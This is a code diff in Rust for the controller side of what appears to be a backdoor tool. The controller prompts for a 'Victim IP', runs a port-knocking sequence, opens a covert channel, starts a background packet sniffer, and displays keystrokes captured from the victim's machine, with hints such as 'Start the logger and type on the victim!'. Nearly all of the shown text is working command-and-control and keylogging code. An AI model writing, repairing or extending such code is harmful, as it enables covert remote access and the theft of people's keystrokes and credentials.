@@ -88,7 +88,7 @@ impl Commander {
         }
     }
 
-    fn initiate_connection(&mut self) {
+ fn initiate_connection(&mut self) {
         let ip_input = prompt("Enter target Victim IP [default: 127.0.0.1]: ");
         let target_ip = if ip_input.is_empty() { 
             "127.0.0.1".parse::<Ipv4Addr>().unwrap() 
@@ -100,37 +100,30 @@ impl Commander {
         };
 
         let iface_name = Self::find_best_interface(target_ip).unwrap_or_else(|| "lo".to_string());
-        let interfaces = datalink::interfaces();
-        let interface = interfaces.into_iter().find(|i| i.name == iface_name).unwrap();
         
-        let local_ip = interface.ips.iter()
-            .find_map(|ip| if let IpAddr::V4(v4) = ip.ip() { Some(v4) } else { None })
-            .unwrap_or(Ipv4Addr::new(127, 0, 0, 1));
-
-        self.victim_ip = Some(target_ip);
-        self.local_ip = Some(local_ip);
-
-        println!("[*] Executing knocking sequence...");
+        println!("[*] Executing knocking sequence to {}...", target_ip);
         match port_knkr::port_knock(target_ip) {
             Ok(session) => {
                 println!("[+] Port knock successful.");
                 
+                // --- START THE SNIFFER HERE ---
+                println!("[DEBUG] Starting background sniffer on {}...", iface_name);
+                self.pcap_handle = Some(PcapHandle::start(&iface_name, target_ip.to_string()));
+
+                let interfaces = datalink::interfaces();
+                let interface = interfaces.into_iter().find(|i| i.name == iface_name).unwrap();
+                let local_ip = interface.ips.iter()
+                    .find_map(|ip| if let IpAddr::V4(v4) = ip.ip() { Some(v4) } else { None })
+                    .unwrap_or(Ipv4Addr::new(127, 0, 0, 1));
+
                 let (chan, rx) = CovertChannel::new(
-                    &interface, 
-                    target_ip, 
-                    local_ip, 
-                    session.tx_port,
-                    session.rx_port 
+                    &interface, target_ip, local_ip, session.tx_port, session.rx_port 
                 );
 
                 self.covert_chan = Some(chan);
-                
-                if let Some(chan_ref) = &self.covert_chan {
-                    covert::start_listening(rx, chan_ref.config.clone());
-                }
-
-                self.knock_session = Some(session);
+                self.victim_ip = Some(target_ip);
                 self.state = SessionState::Connected;
+                self.knock_session = Some(session);
             }
             Err(e) => println!("[!] Knock failed: {}", e),
         }
@@ -150,18 +143,22 @@ impl Commander {
         }
     }
 
-    fn view_keylog(&self) {
-        let path = "../data/pcaps/captured_ascii.txt";
+  fn view_keylog(&self) {
+        // Ensure this path matches the one in pcap_capture.rs
+        let path = "./data/pcaps/captured_keys.txt";
         println!("\n--- Captured Keystrokes (from {}) ---", path);
         match std::fs::read_to_string(path) {
             Ok(content) => {
                 if content.is_empty() {
-                    println!("[!] Log file exists but is currently empty.");
+                    println!("[!] File exists but is empty. Start the logger and type on the victim!");
                 } else {
                     println!("{}", content);
                 }
             }
-            Err(_) => println!("[!] No keylog data found at that path. Ensure the victim is typing and sniffing is active."),
+            Err(_) => {
+                println!("[!] No keylog data found at {}.", path);
+                println!("[*] Hint: Ensure you have started the keylogger (Option 3) and the victim has typed something.");
+            }
         }
     }
 
